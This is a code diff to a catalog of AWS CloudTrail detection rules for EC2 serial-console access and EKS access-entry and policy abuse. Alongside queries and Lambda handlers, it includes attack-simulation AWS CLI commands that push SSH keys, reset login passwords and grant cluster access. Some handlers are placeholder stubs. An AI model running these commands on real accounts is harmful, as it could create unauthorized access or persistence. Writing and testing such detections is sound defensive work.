+          { rawPath: "enrichment.instanceSensitivity", normalizedPath: "cloud.instance.sensitivity", notes: "Resolved criticality or workload classification" },
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor opening serial-console access" },
+          { rawPath: "sourceIPAddress", normalizedPath: "source.ip", notes: "Source IP of the request" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["authentication"], type: ["start"], action: "SendSerialConsoleSSHPublicKey", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          cloud: { instance: { id: "i-0abc123", sensitivity: "production_bastion" } },
+          source: { ip: "203.0.113.10" },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Target Sensitivity Classification", description: "Resolve whether the target is production, identity infrastructure, secrets-facing, or otherwise privileged.", examples: ["production bastion", "directory services host", "break-glass recovery node"], falsePositiveReduction: "Replaces meaningless instance-ID keyword filters with real asset context." },
+        { dimension: "Actor-to-Target Authorization", description: "Determine whether the actor is allowed to use serial console on that class of host.", examples: ["IR team only", "developer outside prod scope"], falsePositiveReduction: "Improves triage by combining target sensitivity with access scope." },
+        { dimension: "Operational Context", description: "Correlate maintenance windows, incident-response workflows, and emergency procedures.", examples: ["planned recovery", "untracked out-of-band access"], falsePositiveReduction: "Reduces noise from legitimate emergency access." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect serial-console access to hosts classified as sensitive. The detector should resolve the target from inventory, determine its criticality, and alert when low-level interactive access is opened on that class of system.",
+        conditions: ["eventSource equals ec2-instance-connect.amazonaws.com", "eventName equals SendSerialConsoleSSHPublicKey", "target instance is classified as sensitive or privileged", "optionally escalate further when actor is outside approved scope for that target class"],
+        tuningGuidance: "1. Classify targets through asset inventory, not name substrings. 2. Pair target sensitivity with actor scope for prioritization. 3. Escalate strongly for production, identity, secrets, and break-glass infrastructure.",
+        whenToFire: "Fire when serial console is used against a sensitive target, especially when the actor is not approved for that host class.",
+      },
+      simulationCommand: "aws ec2-instance-connect send-serial-console-ssh-public-key --instance-id i-0abc123 --serial-port 0 --ssh-public-key file://id_rsa.pub",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with accurate asset classification and scope modeling; high with instance-name heuristics",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with asset inventory joins", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because sensitive-host serial-console access is immediately actionable.",
+        considerations: ["This is the target-centric serial-console detector.", "Asset classification is the main dependency."],
+      },
+    },
   },
   {
     id: "det-095",
-    title: "Serial Console Access Followed by Suspicious Recovery or Persistence Activity",
-    description: "High-confidence lateral movement: SendSerialConsoleSSHPublicKey then shortly after, same actor performs UpdateLoginProfile, CreateLoginProfile, StartSession, IAM policy modification, secrets access, key creation, or other strong post-access activity.",
+    title: "Serial Console Followed by Sensitive Recovery or Persistence Activity",
+    description: "High-confidence post-access detection for serial console use. This should correlate low-level host access with later persistence, credential, or privilege-affecting cloud actions using ordered sequence and stable actor identity.",
     awsService: "EC2",
     relatedServices: ["IAM", "SSM", "Secrets Manager"],
     severity: "Critical",
@@ -12138,9 +12429,9 @@ detection:
       - PutRolePolicy
       - GetSecretValue
       - CreateAccessKey
-  condition: 1 of selection_*
+  condition: selection_serial
 level: critical
-# Full correlation (actor, 15 min) requires SIEM.`,
+# Full correlation requires ordered sequence and stable actor identity across serial-console access and follow-on activity.`,
       splunk: `index=aws sourcetype=aws:cloudtrail
   ((eventSource=ec2-instance-connect.amazonaws.com AND eventName=SendSerialConsoleSSHPublicKey) OR (eventName=UpdateLoginProfile OR eventName=CreateLoginProfile OR eventName=StartSession OR eventName=PutUserPolicy OR eventName=AttachRolePolicy OR eventName=PutRolePolicy OR eventName=GetSecretValue OR eventName=CreateAccessKey))
 | eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
@@ -12173,18 +12464,97 @@ ORDER BY e.serial_time DESC`,
 | filter cnt > 1
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSerialConsoleSSHPublicKey"] } }, null, 2),
+      lambda: `"""
+Serial Console Followed by Sensitive Recovery or Persistence Activity
+Trigger: EventBridge rule matching SendSerialConsoleSSHPublicKey.
+Use for: Correlation from serial-console access to later sensitive cloud activity.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "ec2-instance-connect.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "SendSerialConsoleSSHPublicKey":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-serial-console-plus-sensitive-activity-correlation",
+        "alert": {
+            "rule_id": "det-095",
+            "title": "Serial Console Followed by Sensitive Recovery or Persistence Activity",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "instance_id": detail.get("requestParameters", {}).get("instanceId"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.instanceId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSerialConsoleSSHPublicKey", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { instanceId: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and SendSerialConsoleSSHPublicKey time.", "Review sequence: serial console → persistence/credential activity within 15 min.", "Verify if follow-on activity indicates compromise."],
-    testingSteps: ["Push serial console key, then perform UpdateLoginProfile or GetSecretValue within 15 min.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Identify the actor, target instance, and exact time of the serial-console access event.", "Review ordered follow-on activity such as login-profile changes, access-key creation, secrets access, or IAM mutation within 15 minutes.", "Determine whether the same normalized operator identity performed the later actions and whether the serial-console target explains the sequence."],
+    testingSteps: ["Use serial console on a test instance, then perform `UpdateLoginProfile`, `GetSecretValue`, or another modeled sensitive API within 15 minutes.", "Verify both the serial-console event and later sensitive APIs appear in CloudTrail.", "Run the detector and confirm it requires ordered correlation rather than simple grouped co-occurrence."],
+    lifecycle: {
+      whyItMatters: "Serial console is already a high-signal access path. When it is followed by persistence, credential, or privilege-affecting activity, the sequence becomes one of the clearest indicators of host-enabled cloud abuse.",
+      threatContext: {
+        attackerBehavior: "An attacker may use serial console to recover host access and then pivot into IAM persistence, secrets access, or later interactive sessions and privilege changes.",
+        realWorldUsage: "This is a realistic abuse chain because serial console can restore or deepen host control while the follow-on cloud actions expose how that access was operationalized.",
+        whyItMatters: "The strongest evidence is the ordered chain from low-level access to sensitive cloud behavior, not the presence of either side independently.",
+        riskAndImpact: "If missed, defenders may fail to connect a rare serial-console event with the credential or persistence actions that followed it.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EC2 Instance Connect", "AWS CloudTrail management events for IAM, SSM, Secrets Manager, and related services"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.instanceId", "sourceIPAddress"],
+        loggingRequirements: ["Serial-console and follow-on management events must be ingested into the same analytics environment.", "Actor identity should be normalized across direct and assumed-role sessions.", "The correlation engine must support ordered short-window joins."],
+        limitations: ["CloudTrail cannot show what was done inside the serial-console session.", "Some legitimate recovery actions may be followed by expected remediation changes.", "Actor-only joins can still be noisy without operator and target context."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Primary actor performing the serial-console access or later cloud action" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role where relevant" },
+          { rawPath: "requestParameters.instanceId", normalizedPath: "cloud.instance.id", notes: "Target host for serial-console access" },
+          { rawPath: "follow_on.eventName", normalizedPath: "related.event.action", notes: "Sensitive action after the serial-console event" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["authentication"], type: ["start"], action: "SendSerialConsoleSSHPublicKey", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          cloud: { instance: { id: "i-0abc123" } },
+          related: { event: { action: "UpdateLoginProfile" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Stable Actor Identity", description: "Normalize direct and assumed-role identities so the serial-console operator can be matched to later cloud actions.", examples: ["IAM user", "assumed recovery role"], falsePositiveReduction: "Improves correlation fidelity across role changes." },
+        { dimension: "Target Host Context", description: "Resolve what kind of host received the serial-console access and what privileges it may expose.", examples: ["identity-related host", "prod bastion", "recovery target"], falsePositiveReduction: "Explains why later persistence or credential actions matter." },
+        { dimension: "Follow-On Activity Class", description: "Group later actions into persistence, credential creation, secrets access, or IAM mutation.", examples: ["CreateAccessKey", "UpdateLoginProfile", "GetSecretValue"], falsePositiveReduction: "Makes the abuse path easier to understand and prioritize." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model a short-window post-access sequence: an actor uses serial console and then performs persistence, credential, or privilege-affecting cloud actions soon afterward. It should require ordered correlation and stable actor identity.",
+        conditions: ["first eventSource equals ec2-instance-connect.amazonaws.com and eventName equals SendSerialConsoleSSHPublicKey", "second event is a sensitive cloud API by the same normalized actor identity", "follow-on activity occurs within 15 minutes"],
+        tuningGuidance: "1. Require event order. 2. Normalize actor identity across direct and assumed-role sessions. 3. Escalate further when the serial-console target is sensitive or the actor was not approved to use serial console in the first place.",
+        whenToFire: "Fire when serial-console access is followed quickly by persistence, credential, or privilege-affecting cloud activity from the same operator identity.",
+      },
+      simulationCommand: "aws ec2-instance-connect send-serial-console-ssh-public-key --instance-id i-0abc123 --serial-port 0 --ssh-public-key file://id_rsa.pub && aws iam update-login-profile --user-name demo-user --password 'ExamplePassw0rd!'",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium depending on recovery workflows and operator context",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with ordered event windows", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because the post-access abuse window is short and actionable.",
+        considerations: ["This is one of the strongest serial-console detections in the set.", "Ordered correlation and stable identity normalization are critical."],
+      },
+    },
   },
 
   // --- EKS Create Access Entry ---
   {
     id: "det-096",
     title: "EKS Access Entry Created",
-    description: "Baseline visibility whenever a new access entry is created. Creating access entries is security-sensitive and often relatively uncommon, but may be legitimate platform administration.",
+    description: "Baseline visibility whenever a new EKS access entry is created. Access entries are security-sensitive because they establish a principal-to-cluster authorization foothold, even before broader policies are associated.",
     awsService: "EKS",
     relatedServices: ["IAM"],
     severity: "Medium",
@@ -12214,16 +12584,95 @@ ORDER BY eventTime DESC`,
 | filter eventName = "CreateAccessEntry"
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["CreateAccessEntry"] } }, null, 2),
+      lambda: `"""
+EKS Access Entry Created
+Trigger: EventBridge rule matching CreateAccessEntry.
+Use for: Baseline visibility into new EKS access-entry creation.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "eks.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "CreateAccessEntry":
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-096",
+            "title": "EKS Access Entry Created",
+            "severity": "Medium",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "cluster": request.get("clusterName"),
+            "principal_arn": request.get("principalArn"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.clusterName", "requestParameters.principalArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "CreateAccessEntry", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { clusterName: "prod", principalArn: "arn:aws:iam::123456789012:user/attacker" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and target principal.", "Verify if access entry creation was authorized.", "Check for follow-on AssociateAccessPolicy."],
-    testingSteps: ["Call eks create-access-entry.", "Verify CloudTrail captures the event.", "Run the detection."],
+    investigationSteps: ["Identify the actor, target principal, and cluster associated with the new access entry.", "Verify whether the access entry was expected for this principal and cluster.", "Check for rapid follow-on `AssociateAccessPolicy` activity or unusually broad access scope."],
+    testingSteps: ["Call `eks create-access-entry` for a test principal on a monitored cluster.", "Verify CloudTrail captures the actor, principal ARN, and cluster name.", "Run the baseline rule and confirm it records the authorization foothold without suppressing by naming heuristics."],
+    lifecycle: {
+      whyItMatters: "An access entry is the first-class control-plane object that grants an IAM principal a path into EKS cluster authorization. Even before broad policy association, it is a meaningful identity-to-cluster access event.",
+      threatContext: {
+        attackerBehavior: "An attacker or unauthorized operator may create a new access entry to establish Kubernetes access for a chosen IAM principal.",
+        realWorldUsage: "This is attractive because it uses native EKS access management rather than lower-level Kubernetes credential manipulation.",
+        whyItMatters: "This baseline event feeds stronger detections about broad policy association, suspicious principals, and unauthorized actors.",
+        riskAndImpact: "If missed, defenders may overlook the first stage in a cluster-access escalation chain.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EKS", "Cluster inventory and approved-access models"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.clusterName", "requestParameters.principalArn", "sourceIPAddress"],
+        loggingRequirements: ["CreateAccessEntry events must be ingested.", "The environment should maintain expected principal-to-cluster authorization models.", "Follow-on AssociateAccessPolicy events should be available for correlation."],
+        limitations: ["Access entry creation alone does not always indicate broad effective permissions.", "Legitimate platform administration and bootstrap workflows may create access entries.", "The rule needs cluster and principal context to prioritize effectively."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor creating the access entry" },
+          { rawPath: "requestParameters.clusterName", normalizedPath: "aws.eks.cluster.name", notes: "Cluster receiving the new access entry" },
+          { rawPath: "requestParameters.principalArn", normalizedPath: "aws.eks.access_entry.principal_arn", notes: "Principal being granted EKS access" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["creation"], action: "CreateAccessEntry", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/admin", type: "IAMUser" },
+          aws: { eks: { cluster: { name: "prod" }, access_entry: { principal_arn: "arn:aws:iam::123456789012:user/attacker" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Principal Type and Ownership", description: "Resolve whether the principal is a human user, automation role, node role, or other workload identity.", examples: ["platform role", "IAM user", "workload role"], falsePositiveReduction: "Improves triage and helps identify unusual access subjects." },
+        { dimension: "Cluster Criticality", description: "Classify the target cluster by environment, business role, and privilege sensitivity.", examples: ["production cluster", "shared dev cluster"], falsePositiveReduction: "Raises urgency for new access on critical clusters." },
+        { dimension: "Expected Access Model", description: "Determine whether the principal is expected to receive an access entry on this cluster.", examples: ["approved platform admin", "unexpected app role"], falsePositiveReduction: "Separates legitimate onboarding from suspicious authorization changes." },
+      ],
+      logicExplanation: {
+        humanReadable: "This should remain a broad visibility rule for every successful `CreateAccessEntry` event. It establishes the EKS authorization baseline that stronger broad-access, suspicious-principal, and unauthorized-actor detections build upon.",
+        conditions: ["eventSource equals eks.amazonaws.com", "eventName equals CreateAccessEntry", "errorCode is absent"],
+        tuningGuidance: "1. Keep this baseline broad. 2. Resolve cluster criticality and principal type for triage. 3. Correlate immediately with any later policy association on the same principal and cluster.",
+        whenToFire: "Fire on every successful access-entry creation for visibility.",
+      },
+      simulationCommand: "aws eks create-access-entry --cluster-name prod --principal-arn arn:aws:iam::123456789012:user/demo-user",
+      quality: {
+        signalQuality: 6,
+        falsePositiveRate: "Medium as a baseline visibility rule, low-medium with cluster and principal enrichment",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful because access-entry creation can quickly be followed by broad policy association.",
+        considerations: ["This is the feeder rule for the stronger EKS access-management detections.", "Cluster inventory and access models are useful enrichments."],
+      },
+    },
   },
   {
     id: "det-097",
-    title: "Access Entry Created for Suspicious Principal",
-    description: "Detects likely abuse when the principal being granted cluster access is suspicious: IAM users, break-glass-like names, service/automation identities not expected to access Kubernetes, or unusual role naming patterns.",
+    title: "Access Entry Created for Principal Outside Approved Kubernetes Access Model",
+    description: "Detects access entries granted to principals that are not expected to receive Kubernetes access for the target cluster. This should depend on principal type, ownership, and cluster access models rather than ARN substring heuristics.",
     awsService: "EKS",
     relatedServices: ["IAM"],
     severity: "High",
@@ -12239,19 +12688,7 @@ detection:
   selection:
     eventSource: eks.amazonaws.com
     eventName: CreateAccessEntry
-  filter_iam_user:
-    requestParameters.principalArn|contains: ':user/'
-  filter_breakglass:
-    requestParameters.principalArn|contains:
-      - 'breakglass'
-      - 'BreakGlass'
-      - 'emergency'
-  filter_app_role:
-    requestParameters.principalArn|contains:
-      - '/role/App'
-      - '/role/Workload'
-      - '/role/Service'
-  condition: selection and (filter_iam_user or filter_breakglass or filter_app_role)
+  condition: selection
 level: high`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=eks.amazonaws.com eventName=CreateAccessEntry
 | where like(requestParameters.principalArn, "%:user/%") OR like(requestParameters.principalArn, "%breakglass%") OR like(requestParameters.principalArn, "%BreakGlass%") OR like(requestParameters.principalArn, "%emergency%") OR like(requestParameters.principalArn, "%/role/App%") OR like(requestParameters.principalArn, "%/role/Workload%") OR like(requestParameters.principalArn, "%/role/Service%")
@@ -12271,19 +12708,98 @@ ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.clusterName, requestParameters.principalArn, sourceIPAddress
 | filter eventSource = "eks.amazonaws.com"
 | filter eventName = "CreateAccessEntry"
-| filter requestParameters.principalArn like /:user\\/|breakglass|emergency|\\/role\\/(App|Workload|Service)/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["CreateAccessEntry"] } }, null, 2),
+      lambda: `"""
+Access Entry Created for Principal Outside Approved Kubernetes Access Model
+Trigger: EventBridge rule matching CreateAccessEntry.
+Use for: Real-time evaluation of principal suitability for cluster access.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "eks.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "CreateAccessEntry":
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": "requires-approved-kubernetes-principal-check",
+        "alert": {
+            "rule_id": "det-097",
+            "title": "Access Entry Created for Principal Outside Approved Kubernetes Access Model",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "cluster": request.get("clusterName"),
+            "principal_arn": request.get("principalArn"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.principalArn", "requestParameters.clusterName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "CreateAccessEntry", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { clusterName: "prod", principalArn: "arn:aws:iam::123456789012:user/attacker" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the principal ARN and cluster.", "Verify if this principal should have cluster access.", "Check for AssociateAccessPolicy shortly after."],
-    testingSteps: ["Create access entry for an IAM user.", "Verify detection triggers."],
+    investigationSteps: ["Identify the target principal, its ownership, and the cluster receiving the access entry.", "Verify whether this principal type is approved for Kubernetes access on that cluster.", "Check whether a broad access policy was associated shortly afterward."],
+    testingSteps: ["Create an access entry for a principal that is outside the approved access model for a test cluster.", "Verify CloudTrail captures the principal ARN and cluster details.", "Run the detector and confirm it uses principal classification and access models rather than substring filters like `:user/` or `breakglass`."],
+    lifecycle: {
+      whyItMatters: "Not every IAM principal should become a Kubernetes subject. Access-entry creation for the wrong type of principal is a strong signal of privilege escalation or control-plane misuse.",
+      threatContext: {
+        attackerBehavior: "An attacker may grant cluster access to an IAM user, workload role, or other identity that is not normally part of the approved Kubernetes access model.",
+        realWorldUsage: "This technique is practical because it lets the attacker choose a durable AWS identity and convert it into cluster access through native EKS controls.",
+        whyItMatters: "The key question is whether the principal belongs in the cluster access model, not whether its ARN contains suspicious words.",
+        riskAndImpact: "If missed, unexpected principals can gain Kubernetes access paths that lead to secrets exposure, workload manipulation, or broader environment takeover.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for EKS", "Principal ownership inventory", "Cluster-specific approved access models"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.clusterName", "requestParameters.principalArn", "sourceIPAddress"],
+        loggingRequirements: ["CreateAccessEntry events must be ingested with cluster and principal context.", "The environment should know which principal categories are valid for each cluster.", "Policy-association events should be available for follow-on correlation."],
+        limitations: ["Without cluster access models the rule degenerates into weak anomaly logic.", "Some temporary or break-glass principals may be valid when explicitly approved.", "Principal type alone is not enough without environment context."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.clusterName", normalizedPath: "aws.eks.cluster.name", notes: "Cluster receiving the access entry" },
+          { rawPath: "requestParameters.principalArn", normalizedPath: "aws.eks.access_entry.principal_arn", notes: "Principal being granted Kubernetes access" },
+          { rawPath: "enrichment.principalClass", normalizedPath: "aws.eks.access_entry.principal_class", notes: "Resolved ownership or identity class of the principal" },
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor creating the access entry" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["creation"], action: "CreateAccessEntry", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { eks: { cluster: { name: "prod" }, access_entry: { principal_arn: "arn:aws:iam::123456789012:role/AppRole", principal_class: "application_role" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Principal Classification", description: "Resolve whether the target principal is a human identity, platform role, node role, workload role, or automation account.", examples: ["platform role", "application role", "IAM user"], falsePositiveReduction: "Lets the rule reason about whether the principal belongs in Kubernetes access management." },
+        { dimension: "Cluster Access Model", description: "Determine which principal classes are approved for the target cluster.", examples: ["platform team only", "shared engineering access"], falsePositiveReduction: "Replaces brittle principal-name matching with actual access policy." },
+        { dimension: "Cluster Criticality", description: "Classify the cluster by sensitivity and privilege impact.", examples: ["prod cluster", "sandbox cluster"], falsePositiveReduction: "Raises urgency when unexpected principals receive access to critical clusters." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect when `CreateAccessEntry` grants Kubernetes access to a principal that is outside the approved access model for the target cluster. It should classify the principal, compare it to expected cluster access patterns, and alert when the subject is out of policy.",
+        conditions: ["eventSource equals eks.amazonaws.com", "eventName equals CreateAccessEntry", "target principal is outside the approved principal classes or ownership model for the cluster"],
+        tuningGuidance: "1. Model cluster-specific access rules. 2. Classify principals by ownership and purpose. 3. Escalate further when the principal is a human user or workload role on a sensitive cluster.",
+        whenToFire: "Fire when an access entry is created for a principal that does not belong in the target cluster's access model.",
+      },
+      simulationCommand: "aws eks create-access-entry --cluster-name prod --principal-arn arn:aws:iam::123456789012:role/AppRole",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with principal classification and cluster access models; high with ARN substring heuristics",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with cluster and identity inventories", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful because suspicious access entries may be followed quickly by policy association.",
+        considerations: ["This is the principal-centric EKS access-entry detector.", "Cluster access-model data is the main dependency."],
+      },
+    },
   },
   {
     id: "det-098",
     title: "Access Policy Association Grants Broad Cluster Access",
-    description: "Detects likely privilege escalation when a broad EKS access policy is associated to an access entry. Flags cluster-wide scope or admin-like policy ARNs (AmazonEKSClusterAdminPolicy, AmazonEKSAdminViewPolicy, etc.).",
+    description: "Detects EKS policy associations that grant cluster-wide or otherwise high-impact access. This should be driven by policy semantics and effective scope, not just policy-name substrings.",
     awsService: "EKS",
     relatedServices: ["IAM"],
     severity: "High",
@@ -12299,15 +12815,7 @@ detection:
   selection:
     eventSource: eks.amazonaws.com
     eventName: AssociateAccessPolicy
-  filter_broad:
-    requestParameters.policyArn|contains:
-      - 'ClusterAdmin'
-      - 'AdminView'
-      - 'AmazonEKSClusterAdminPolicy'
-      - 'AmazonEKSAdminViewPolicy'
-  filter_cluster_scope:
-    requestParameters.accessScope|contains: 'cluster'
-  condition: selection and (filter_broad or filter_cluster_scope)
+  condition: selection
 level: high`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=eks.amazonaws.com eventName=AssociateAccessPolicy
 | where like(requestParameters.policyArn, "%ClusterAdmin%") OR like(requestParameters.policyArn, "%AdminView%") OR like(requestParameters.policyArn, "%AmazonEKSClusterAdminPolicy%") OR like(requestParameters.policyArn, "%AmazonEKSAdminViewPolicy%") OR like(requestParameters.accessScope, "%cluster%")
@@ -12325,19 +12833,99 @@ ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.clusterName, requestParameters.principalArn, requestParameters.policyArn, requestParameters.accessScope, sourceIPAddress
 | filter eventSource = "eks.amazonaws.com"
 | filter eventName = "AssociateAccessPolicy"
-| filter requestParameters.policyArn like /ClusterAdmin|AdminView|AmazonEKSClusterAdminPolicy|AmazonEKSAdminViewPolicy/ or requestParameters.accessScope like /cluster/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.eks"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["eks.amazonaws.com"], eventName: ["AssociateAccessPolicy"] } }, null, 2),
+      lambda: `"""
+Access Policy Association Grants Broad Cluster Access
+Trigger: EventBridge rule matching AssociateAccessPolicy.
+Use for: Real-time evaluation of EKS policy semantics and effective access scope.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "eks.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "AssociateAccessPolicy":
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": "requires-eks-policy-semantics-and-scope-evaluation",
+        "alert": {
+            "rule_id": "det-098",
+            "title": "Access Policy Association Grants Broad Cluster Access",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "cluster": request.get("clusterName"),
+            "principal_arn": request.get("principalArn"),
+            "policy_arn": request.get("policyArn"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.policyArn", "requestParameters.accessScope", "requestParameters.principalArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "AssociateAccessPolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { clusterName: "prod", principalArn: "arn:aws:iam::123456789012:user/attacker", policyArn: "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy", accessScope: { type: "cluster" } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the policy ARN and access scope.", "Verify if broad access was authorized.", "Check the principal that received the policy."],
-    testingSteps: ["Associate AmazonEKSClusterAdminPolicy to an access entry.", "Verify detection triggers."],
